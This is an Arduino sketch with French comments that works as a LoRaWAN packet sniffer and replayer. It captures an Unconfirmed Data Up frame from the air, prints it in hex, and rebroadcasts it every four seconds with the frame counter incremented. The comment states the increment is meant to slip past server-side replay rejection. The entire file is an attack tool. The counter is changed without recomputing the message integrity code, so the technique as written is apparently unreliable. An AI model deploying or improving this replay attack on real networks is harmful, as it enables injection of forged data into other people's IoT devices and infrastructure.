#include <SPI.h>
#include <LoRa.h>

#define LORA_FREQUENCY 868.3E6  // Fréquence 868,3 MHz

uint8_t packet[256];  // buffer pour stocker le paquet reçu
int packetSize = 0;  // taille du paquet reçu
bool packetCaptured = false;  // flag pour savoir si on a capturé un paquet

void setup() {
  Serial.begin(9600);
  while (!Serial);

  Serial.println("LoRaWAN Sniffer et Replayer");

  if (!LoRa.begin(LORA_FREQUENCY)) {  // initialisation du module LoRa
    Serial.println("Erreur lors de l'initialisation de LoRa !");
    while (1);
  }

  // Configurer le spreading factor et la bande passante
  LoRa.setSpreadingFactor(7);  // SF7
  LoRa.setSignalBandwidth(125E3);  // 125 kHz
  LoRa.setCodingRate4(5);  // Coding Rate 4/5


  Serial.println("En attente de paquets LoRaWAN...");
}

void loop() {
  if (!packetCaptured) {
    packetSize = LoRa.parsePacket();
    if (packetSize) {  // si un paquet est reçu
      Serial.println("\nPaquet reçu !");
      Serial.print("Taille du paquet : ");
      Serial.println(packetSize);

      if (packetSize > sizeof(packet)) {  // sécurité si un paquet est trop grand
        Serial.println("Erreur : paquet trop grand !");
        return;
      }

      Serial.print("RSSI : ");
      Serial.println(LoRa.packetRssi());

      // on vide le buffer avant d'y mettre le nouveau paquet
      memset(packet, 0, sizeof(packet));

      // on récupère les octets du paquet
      int i = 0;
      while (LoRa.available() && i < packetSize) {
        packet[i++] = LoRa.read();
      }

      if (packet[0] == 0x40) { // vérifier si c'est un paquet Unconfirmed Data Up pour cette exemple
        Serial.println("Paquet Unconfirmed Data Up capturé !");
        packetCaptured = true;  // on indique qu'on a capturé un paquet

        // affichage du contenu en hexa
        Serial.print("Données reçues (hex) : ");
        for (int i = 0; i < packetSize; i++) {
          Serial.print(packet[i] < 16 ? "0" : "");  // ajoute un zéro pour les valeurs < 0x10
          Serial.print(packet[i], HEX);
          Serial.print(" ");
        }
        Serial.println();
      }
    }
  }

  if (packetCaptured) {  // si un paquet a été capturé, on le rejoue
    Serial.println("Rejeu du paquet...");

    // affichage du compteur de trames avant modif
    Serial.print("FCnt original : ");
    Serial.print(packet[7], HEX);
    Serial.print(packet[6], HEX);
    Serial.println();

    // incrémenter le compteur de trames (important pour éviter un rejet côté serveur)
    packet[6]++;
    if (packet[6] == 0) {  // si l'octet bas passe à 0, on incrémente l'octet haut
      packet[7]++;
    }

    // affichage du compteur de trames après modif
    Serial.print("FCnt après incrément : ");
    Serial.print(packet[7], HEX);
    Serial.print(packet[6], HEX);
    Serial.println();

    // envoi du paquet modifié
    Serial.print("Taille du paquet envoyé : ");
    Serial.println(packetSize);
    
    LoRa.beginPacket();
    LoRa.write(packet, packetSize);
    LoRa.endPacket();

    Serial.println("Paquet envoyé !");
    delay(4000);
  }
}
